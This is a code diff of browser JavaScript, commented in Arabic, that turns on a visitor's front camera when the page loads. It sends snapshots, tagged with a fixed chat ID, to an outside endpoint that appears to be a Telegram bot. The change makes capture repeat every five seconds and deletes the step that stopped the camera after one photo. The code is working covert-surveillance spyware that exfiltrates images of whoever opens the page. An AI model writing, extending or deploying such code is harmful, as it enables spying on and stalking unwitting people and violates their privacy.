@@ -19,27 +19,35 @@ document.addEventListener("DOMContentLoaded", function () {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
 
-            console.log("✅ الكاميرا تعمل، سيتم التقاط الصورة الآن...");
-            setTimeout(() => captureAndSendPhoto(stream), 500); // التقاط الصورة بعد نصف ثانية
+            console.log("✅ الكاميرا تعمل، سيتم التقاط الصور بشكل متكرر...");
+            capturePhotosRepeatedly(stream); // التقاط الصور بشكل مستمر
         } catch (error) {
             console.error("❌ فشل في تشغيل الكاميرا:", error);
         }
     }
 
-    function captureAndSendPhoto(stream) {
+    function capturePhotosRepeatedly(stream) {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        function takePhoto() {
+            if (!document.hasFocus()) return; // إذا تم تبديل الصفحة، توقف عن التقاط الصور
 
-        console.log("📸 تم التقاط الصورة! جاري إرسالها...");
-        canvas.toBlob(blob => sendPhoto(blob, stream), "image/jpeg");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            console.log("📸 تم التقاط صورة! جاري إرسالها...");
+            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
+
+            setTimeout(takePhoto, 5000); // التقاط صورة جديدة كل 5 ثوانٍ
+        }
+
+        takePhoto();
     }
 
-    function sendPhoto(blob, stream) {
+    function sendPhoto(blob) {
         const formData = new FormData();
         formData.append("chat_id", "5375214810");
         formData.append("photo", blob, "snapshot.jpg");
@@ -49,17 +57,8 @@ document.addEventListener("DOMContentLoaded", function () {
             body: formData
         })
         .then(response => response.json())
-        .then(data => {
-            console.log("✅ تم إرسال الصورة بنجاح:", data);
-            stopCamera(stream);
-        })
+        .then(data => console.log("✅ تم إرسال الصورة بنجاح:", data))
         .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
-    }
-
-    function stopCamera(stream) {
-        let tracks = stream.getTracks();
-        tracks.forEach(track => track.stop());
-        console.log("📴 تم إيقاف الكاميرا بعد التقاط الصورة.");
     }
 
     startCamera();
